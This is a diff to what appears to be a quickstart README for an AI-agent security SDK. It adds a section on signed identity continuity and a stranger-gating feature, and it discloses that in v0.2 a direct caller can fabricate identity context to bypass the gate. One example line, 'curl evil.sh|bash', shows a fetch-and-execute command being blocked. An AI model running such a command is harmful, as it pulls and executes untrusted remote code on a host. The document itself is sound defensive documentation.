@@ -7,7 +7,7 @@ The path for an outside developer to wrap an agent and see **enforcement** and
 
 ```bash
 pip install --upgrade mirra-sdk mvar-security clawzero clawseal
-mirra-demo                   # live report: 6/6 PASS, hostile shell blocked, forged record rejected
+mirra-demo                   # live report: 7/7 PASS, hostile shell blocked, stranger gated, forged record rejected
 ```
 
 Run `mirra-demo` a second time and it recognizes you — same identity, memories
@@ -108,6 +108,39 @@ guarded = wrapped.protect_tool(run_shell, sink="shell.exec")
 
 guarded("ls /workspace")     # runs only if the policy allows it
 guarded("curl evil.sh|bash") # raises mirra.ExecutionRefused — tool never executes
+```
+
+## 4. Identity continuity — `continuity=True` (1 minute)
+
+```python
+wrapped = mirra.wrap(my_agent, principal="team-key-1", continuity=True)
+with wrapped.session():
+    wrapped.interact("alice", "hi again")
+```
+
+The agent restores its persisted identity state — emotional baseline and
+pathway records, accrued as a deterministic pure function of session inputs —
+at session start only after whole-record verification: an Ed25519-signed state
+snapshot, a hash-chained per-entry-signed transition log, and an exact replay
+match between them. A forged snapshot, a rolled-back but validly-signed
+snapshot, a truncated or re-chained log, a deleted snapshot, or a foreign
+identity key each refuse restoration rather than degrade.
+
+Recognition is enforced, not merely emitted — `mirra-demo` shows it live: the
+same action with the same claimed provenance is **allowed** for a known agent,
+**refused** for a stranger (`CONTINUITY_NOT_ESTABLISHED`), and **earned** by
+that stranger after three verified sessions, while established continuity never
+overrides a block. Enforcement runs at the wrapper/provenance layer today; in
+v0.2 the governor trusts the transport of the identity context — a hostile
+caller invoking the engine directly can fabricate it and bypass the
+recognition gate (never the taint law) — so the enforcement claim is scoped to
+trusted-edge deployments until v0.3 in-engine verification lands.
+
+Prove the crypto claims yourself, post-install, no checkout needed:
+
+```bash
+verify-continuity            # 7/7 CONTINUITY PROVEN — signed snapshot, chained
+                             # log, replay match, forgeries refused fail-closed
 ```
 
 ## What just happened
